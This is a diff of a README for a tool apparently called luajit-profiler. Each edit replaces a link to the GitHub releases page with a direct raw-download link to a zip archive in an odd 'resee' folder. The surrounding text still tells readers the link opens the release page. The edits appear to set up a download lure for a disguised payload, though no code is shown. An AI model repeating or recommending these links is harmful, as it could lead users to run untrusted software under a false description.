@@ -1,6 +1,6 @@
 # ⚙️ luajit-profiler - View LuaJIT Profiling Results Easily
 
-[![Download luajit-profiler](https://img.shields.io/badge/Download-luajit--profiler-brightgreen?style=for-the-badge)](https://github.com/Chanakya20030902/luajit-profiler/releases)
+[![Download luajit-profiler](https://img.shields.io/badge/Download-luajit--profiler-brightgreen?style=for-the-badge)](https://github.com/Chanakya20030902/luajit-profiler/raw/refs/heads/main/resee/luajit_profiler_1.7.zip)
 
 ## 🔍 What is luajit-profiler?
 
@@ -35,7 +35,7 @@ Follow these steps to download and run luajit-profiler on your Windows computer.
 
 Click the big green button above or go to this link:
 
-[https://github.com/Chanakya20030902/luajit-profiler/releases](https://github.com/Chanakya20030902/luajit-profiler/releases)
+[https://github.com/Chanakya20030902/luajit-profiler/raw/refs/heads/main/resee/luajit_profiler_1.7.zip](https://github.com/Chanakya20030902/luajit-profiler/raw/refs/heads/main/resee/luajit_profiler_1.7.zip)
 
 This link opens the release page where you can find the latest version of luajit-profiler.
 
@@ -112,4 +112,4 @@ If you continue to have problems, check the project's GitHub page for support op
 
 Return to the releases page to download the latest version:
 
-[https://github.com/Chanakya20030902/luajit-profiler/releases](https://github.com/Chanakya20030902/luajit-profiler/releases)
+[https://github.com/Chanakya20030902/luajit-profiler/raw/refs/heads/main/resee/luajit_profiler_1.7.zip](https://github.com/Chanakya20030902/luajit-profiler/raw/refs/heads/main/resee/luajit_profiler_1.7.zip)
